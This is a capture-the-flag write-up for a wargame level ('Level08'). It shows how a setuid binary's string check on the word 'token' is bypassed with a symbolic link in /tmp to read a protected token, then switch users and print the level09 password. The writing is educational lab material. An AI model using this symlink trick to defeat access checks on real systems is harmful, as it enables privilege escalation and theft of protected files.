# Level08 Writeup

## Objective
Gain access to the `flag08` user and retrieve the password for `level09`.

## Steps Taken

1. **Initial Inspection**  
   Listing files in the home directory revealed:
   ```
   -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
   -rw-------  1 flag08 flag08    26 Mar  5  2016 token
   ```
   The binary is owned by `flag08` and the `token` file is not accessible by `level08` directly.

2. **Testing the Binary**  
   Running the binary with the `token` file:
   ```bash
   ./level08 token
   ```
   Output:
   ```
   You may not access 'token'
   ```

3. **Binary Analysis**  
   I analyzed the binary using [Dogbolt.org](https://dogbolt.org/) and found the following logic:
   ```c
   pcVar1 = strstr((char *)in_stack_00000008[1],"token");
   if (pcVar1 != (char *)0x0) {
       printf("You may not access '%s'\n", in_stack_00000008[1]);
       exit(1);
   }
   ```
   This reveals that the program checks if the string "token" exists in the file path argument. If it does, it refuses access.

4. **Bypass with Symbolic Link**  
   Since the check is purely string-based, I created a symbolic link that avoids the name "token":
   ```bash
   ln -s ~/token /tmp/my_file
   ./level08 /tmp/my_file
   ```
   Output:
   ```
   quif5eloekouj29ke0vouxean
   ```

5. **Login and Flag Retrieval**  
   I used the retrieved token to switch to `flag08`:
   ```bash
   su flag08
   ```
   Then ran:
   ```bash
   getflag
   ```
   Which returned:
   ```
   Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
   ```

## Result
Successfully retrieved the password for `level09`:  
```
25749xKZ8L7DkSCwJkT9dyv6f
```
